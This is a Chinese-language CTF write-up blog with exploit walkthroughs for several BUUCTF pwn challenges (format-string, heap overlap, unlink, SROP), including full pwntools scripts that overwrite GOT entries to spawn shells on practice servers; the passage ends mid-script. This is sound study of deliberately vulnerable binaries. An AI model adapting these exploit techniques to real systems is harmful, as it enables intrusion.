<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; stack 60</span><br><span class="line">00:0000│ esp 0xffffcb40 —▸ 0xffffcc60 ◂— &#x27;Repeater:ss\n\n&#x27;</span><br><span class="line">01:0004│-254 0xffffcb44 —▸ 0x804888d ◂— push edx /* &#x27;Repeater:%s\n&#x27; */</span><br><span class="line">02:0008│-250 0xffffcb48 —▸ 0xffffcb5f ◂— 0xa7373 /* &#x27;ss\n&#x27; */</span><br><span class="line">03:000c│-24c 0xffffcb4c ◂— 0x340</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">06:0018│-240 0xffffcb58 ◂— 0xd /* &#x27;\r&#x27; */</span><br><span class="line">07:001c│-23c 0xffffcb5c ◂— 0x73000340</span><br><span class="line">08:0020│-238 0xffffcb60 ◂— 0xa73 /* &#x27;s\n&#x27; */</span><br><span class="line">09:0024│-234 0xffffcb64 ◂— 0</span><br><span class="line">... ↓        50 skipped</span><br><span class="line">pwndbg&gt; p/x $ebp-0x239</span><br><span class="line">$1 = 0xffffcb5f</span><br></pre></td></tr></table></figure>

<p>$ebp-0x239是ida给出的s字符串的位置 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In [1]: (0xffffcb5f - 0xffffcb40)</span><br><span class="line">Out[1]: 31</span><br></pre></td></tr></table></figure>

<p>注意第0个参数是esp 也就是格式化字符串的地址 因此要减去4 31-4&#x3D;27 那么我们填充一个字节 就是28 &#x3D; 4*7 也就是第八个参数是格式化字符串</p>
<p>盲打:<br>先输入<br>aaaa%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello,I am a computer Repeater updated.</span><br><span class="line">After a lot of machine learning,I know that the essence of man is a reread machine!</span><br><span class="line">So I&#x27;ll answer whatever you say!</span><br><span class="line">Please tell me:aaaa%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p</span><br><span class="line">Repeater:aaaa0x804888d/0xff8643af/0x340/0x340/0x340/0x56/0x61000340/0x25616161/0x70252f70/0x2f70252f/0x252f7025/0x70252f70/0x2f70252f/0x252f7025/0x70252f70/0x2f70252f/0x252f7025/0x70252f70/0x2f70252f/0x252f7025/0x70252f70/0x2f70252f/0x252f7025/0x70252f70</span><br><span class="line"></span><br><span class="line">Please tell me:^C</span><br></pre></td></tr></table></figure>

<p>在这里面找到0x61 可以看到在第七个和第八个都有出现 第七个里多一个 我们就填充一个b 然后再aaaa%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p&#x2F;%p</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Please tell me:baaaa%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p</span><br><span class="line">Repeater:baaaa0x804888d/0xffb6ed5f/0x340/0x340/0x340/0x57/0x62000340/0x61616161/0x252f7025/0x70252f70/0x2f70252f/0x252f7025/0x70252f70/0x2f70252f/0x252f7025/0x70252f70/0x2f70252f/0x252f7025/0x70252f70/0x2f70252f/0x252f7025/0x70252f70/0x2f70252f/0x252f7025</span><br></pre></td></tr></table></figure>

<p>这里就是对齐过的 第八个参数就是aaaa的位置 之后我们的payload都要加一个’b’</p>
<p>然后我们需要做的是泄露libc的地址 由于我们已经知道aaaa是第八个参数 可以用f“%{n}8s” 这种格式来输出指定参数的位置上的地址对应的字符串<br>例如如果我们输入b’b‘ + p32(puts.got) + b’%8$s’ 就能输出puts的got内的内容<br>输出之后 这一题我们使用got表覆盖的方式来打<br>我们用fmtstr_payload 来快速生成写入的payload</p>
<p>fmtstr_payload(offset , writes,numbwritten ,write_size)<br>第一个参数是偏移 前面已经试出来第八个参数 这里就填8<br>writes是一个字典 {} 左边是要写入的位置 右边是要写入的值<br>numbwritten是已经输出的个数这里是Repeater:b 也就是 10<br>综上我们第二个payload就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27; + fmtstr_payload(8,&#123;printf_got:system_libc&#125;,10)</span><br></pre></td></tr></table></figure>

<p>由于system前面有个Repeater: 所以我们先打个分号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Starting local process &#x27;./axb_2019_fmt32&#x27;: pid 19622</span><br><span class="line">0xf7d191d0</span><br><span class="line">/home/juryorca/pwn/Buuctf/axb_2019_fmt32/exp.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  p.send(payload)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Y\xda\xf7</span><br><span class="line">Please tell me:Repeater:a         \x8d                                                                                                                                                                           \xcf                @                                     @aaa\x15\xa0\x04\x08\x14\xa0\x04\x08\x16\xa0\x04\x08\x17\xa0\x04\x08</span><br><span class="line">sh: 1: Please: not found</span><br><span class="line">sh: 1: Repeater:: not found</span><br><span class="line">$ ls</span><br><span class="line">axb_2019_fmt32      axb_2019_fmt32.id1  axb_2019_fmt32.nam  exp.py</span><br><span class="line">axb_2019_fmt32.id0  axb_2019_fmt32.id2  axb_2019_fmt32.til</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process &#x27;./axb_2019_fmt32&#x27; (pid 19622)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;i386&#x27;)</span><br><span class="line">p=process ( &#x27;./axb_2019_fmt32&#x27;)</span><br><span class="line">printf_got = 0x0804A014</span><br><span class="line">payload = b&#x27;b&#x27; + p32(printf_got) + b&#x27;%8$s&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(p32(printf_got))</span><br><span class="line">printf_libc =u32( p.recv(4) )</span><br><span class="line">print(hex(printf_libc))</span><br><span class="line">libc_base = printf_libc-(0xf7d821d0-0xf7d28000)</span><br><span class="line">system_libc =libc_base + 0x000524c0</span><br><span class="line">payload = b&#x27;a&#x27; + fmtstr_payload(8,&#123;printf_got:system_libc&#125;,10)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = &#x27;;/bin/sh&#x27;</span><br><span class="line">p.recv(1)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打远程的时候注意libc版本问题。</p>
<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><p>这题是我自主写的 不过相比网上的wp写的复杂了，思维太公式化这一块<br>我自己的思路是利用off-one-byte伪造出向前合并 大致是 从第三块合并到第一块 这样重新申请出来的就可以控制到和第二块的重叠<br>并且在unsortedbin切割的过程中可以通过main_arena 泄露出libc地址 然后通过控制指针来覆盖got表</p>
<p>具体流程如下:</p>
<p>先申请四次 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>第四个用于当作边界防止unsortebbin和top_chunk合并，同时写入&#x2F;bin&#x2F;sh便于后续运行system(‘&#x2F;bin&#x2F;sh’)<br>第三块的大小是刻意设计的 0x70+0x20是0x90 如果覆盖size进行重叠 0x90正好能进入unsortebin 而0x70进入fastbin<br>fastbin不会重置后一块的prev_inuse ，使得程序不会因为double free检查崩溃<br>第一块用于free之后和第三块进行合并<br>第二块是被重叠的</p>
<p>进行第三部分 指针chunk的prev_size 和size伪造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x90</span>)+<span class="string">b&#x27;\x90&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>先free 第一部分 再free 第三部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure>

<p>这时候重叠已经完成 unsortedbin从第一部分数据chunk开始一直到第三部分数据chunk结束<br>申请0x90+0x20大小的chunk 这样fd和bk数据会被填入第二部分的数据chunk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x90+0x20-0x10,b&#x27;a&#x27;)</span><br><span class="line">main_arena=u64(show(1).ljust(8,b&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>

<p>这时候再申请任意大小 ，就会有一个指针chunk和第二部分的数据chunk重叠 可以覆盖指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x30,b&#x27;a&#x27;)</span><br></pre></td></tr></table></figure>

<p>后续就不说了 相对来说比较简单</p>
<p>总的exploit</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./heapcreator&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25550</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span> ,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x90</span>)+<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x90</span>+<span class="number">0x20</span>-<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">main_arena=u64(show(<span class="number">1</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># 45390 system</span></span><br><span class="line">libc_base = main_arena - (<span class="number">0x7602b25c4b78</span>-<span class="number">0x7602b2200000</span>)</span><br><span class="line">system = libc_base + <span class="number">0x45390</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">payload = p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我说这个过程麻烦 其实是我的过程包含了预期解的过程 并且预期解更简单<br>就是构造重叠不一定需要合并 其实只需要修改size并free 如果两个fastbin重叠 申请过来自然就重叠了 而我们刚才的第三部分已经有了fastbin和unsortedbin的重叠<br>那么如果我们第三部分申请的是0x20大小 然后覆盖size为0x40 再申请回来 数据chunk自然会和指针chunk重叠。<br>然后控制指针任意读任意写就行了。</p>
<h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><p>这题之前参考wp写过一次 但是这次是自主写的 和wp比对了一下 发现之前的写法相对 麻烦 目前的写法可能还能优化 主要是在构造重叠方面<br>程序功能大致如下<br>allocate:任意大小申请，有初始化<br>fill:填充 可以溢出<br>delete:free 有归零<br>dump:输出 </p>
<p>我这次的思路是伪造fake chunk头,覆盖大小 然后通过unsortedbin free检查的缺陷 造成重叠<br>流程：</p>
<p>申请阶段<br>allocate(0x30)<br>allocate(0x80)<br>allocate(0x80)<br>allocate(0x30)<br>allocate(0x60) #4<br>allocate(0x60)<br>allocate(0x60)<br>4开始是为了后续打fastbindup用的可以不管 3是用来隔离的<br>主要看1和2<br>我们覆盖1的大小使得1大小变大 然后free掉，这时候产生一个存在和2重叠的unsortedbin<br>注意unsortebinfree时会对下一个chunk检查 为了构造重叠 我们这里覆盖1大小为0xb0 那么下一个大小就是0x70 size应该填入0x71<br>这里覆盖完之后直接free1<br>然后再申请回来<br>这时候1和2已经重叠了 但是2的data被破坏了 手动修复一下就行<br>然后再free2即可泄露main_arena<br>泄露了之后就是fastbin dup打到malloc_hook这个比较简单就不说了<br>相对来说可以优化的地方是构造重叠第一个chunk可以是fastbin 检查会少点。</p>
<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>这一题和hitcontraining_uaf思路特别类似 甚至比那个更简单<br>也是删除两次 然后申请一个大小和带指针chunk一致的数据chunk 就能构造重叠 结合uaf就能打system(“&#x2F;bin&#x2F;sh“)<br>但是这题只给四个字节 所以改打system(“sh”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27652</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_int</span>(<span class="params">index,num</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;CNote &gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index &gt;&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Blob type:&#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Value &gt;&#x27;</span>,<span class="built_in">str</span>(num).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_text</span>(<span class="params">index,lenth,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;CNote &gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index &gt;&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Blob type:&#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Length &gt;&#x27;</span>,<span class="built_in">str</span>(lenth).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Value &gt;&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;CNote &gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index &gt;&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">new_int(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">new_int(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new_text(<span class="number">2</span>,<span class="number">12</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(<span class="number">0x08048500</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="babyfengshui"><a href="#babyfengshui" class="headerlink" title="babyfengshui"></a>babyfengshui</h2><p>add: 申请任意大小，会初始化 。再申请一个0x80大小的管理chunk<br>delete: 删除 会把0x80的管理chunk指针归零，但是不会重置管理chunk的数据<br>display: 输出<br>update: 编辑 用了个很奇怪的手段 就是写入字节不能超过管理chunk的size起点</p>
<p>很显然漏洞就在update里 它默认两个时紧邻的 但这显然不现实 我们只要在前面free过一个0x88大小的chunk 然后申请0x88大小的chunk 数据chunk就会分配到非常前面<br>后面就很简单了 能控制指针没有pie的程序的统一套路</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyfengshui_33c3_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29879</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span> , <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;size of description:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;text length:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;description: &#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span>(p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span> , <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;text length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(data)).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">free_got = <span class="number">0x0804B010</span></span><br><span class="line">update(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x29</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x89</span>)+p32(free_got))</span><br><span class="line">leak = display(<span class="number">1</span>)</span><br><span class="line">free_libc = u32(leak[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_libc))</span><br><span class="line">libc_base = free_libc - (<span class="number">0xf7da0750</span>-<span class="number">0xf7d30000</span>)</span><br><span class="line">system_libc = libc_base + <span class="number">0x0003a940</span></span><br><span class="line">update(<span class="number">1</span>,p32(system_libc))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h2><p>非常经典的一题 unlink的基础模板<br>打unlink的时候要注意是要在被free的chunk上一个chunk里面伪造chunk头 因为我们指针一般从数据开始 但是unsortedbin管理指针一般从head开始<br>然后就是套路过程 不多说</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27474</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(data)).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.send(data)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x20</span>)</span><br><span class="line">new(<span class="number">0x50</span>)</span><br><span class="line">new(<span class="number">0x90</span>)</span><br><span class="line">new(<span class="number">0x80</span>)</span><br><span class="line">new(<span class="number">0x20</span>)</span><br><span class="line">ptr =<span class="number">0x602158</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0xa1</span>)+ p64(ptr-<span class="number">0x18</span>) + p64(<span class="number">0x91</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x602018</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x400760</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x602020</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">puts_libc = u64(p.recvline().strip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># 0x7d7d1d46f690-0x7d7d1d400000</span></span><br><span class="line">libc_base = puts_libc - (<span class="number">0x7d7d1d46f690</span>-<span class="number">0x7d7d1d400000</span>)</span><br><span class="line"><span class="comment"># system 0000000000045390</span></span><br><span class="line">system_libc = libc_base + <span class="number">0x0000000000045390</span></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x602018</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(system_libc))</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h2><p>和前面有个叫hacknote的非常相似 但是这题用到一个trick<br>因为我们覆盖完system后参数也是指向system地址的 解决这个问题就是在这个地址后面加’;sh\x00’</p>
<h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a>mrctf2020_easy_equation</h2><p>比较简单的格式化字符串 区别是是64位的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node5.buuoj.cn&#x27;,27922)</span><br><span class="line">#p = process(&#x27;./mrctf2020_easy_equation&#x27;)</span><br><span class="line">payload = b&#x27;1%1$c%9$n&#x27;+p64(0x60105C)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title=".&#x2F;ciscn_2019_es_7"></a>.&#x2F;ciscn_2019_es_7</h2><p>基本上是工具的使用 最后rop链要求满足<br>p64(sigreturn_addr)+p64(syscall_ret)+bytes(sigframe)<br>sigreturn_addr 是mov rax ,15;ret 的gadget</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&quot;./ciscn_2019_es_7&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27972</span>)</span><br><span class="line"></span><br><span class="line">syscall_ret=<span class="number">0x400517</span></span><br><span class="line">sigreturn_addr=<span class="number">0x4004da</span></span><br><span class="line">system_addr=<span class="number">0x4004E2</span></span><br><span class="line">ret = <span class="number">0x4003a9</span></span><br><span class="line">rax=<span class="number">0x4004f1</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh&quot;</span>+<span 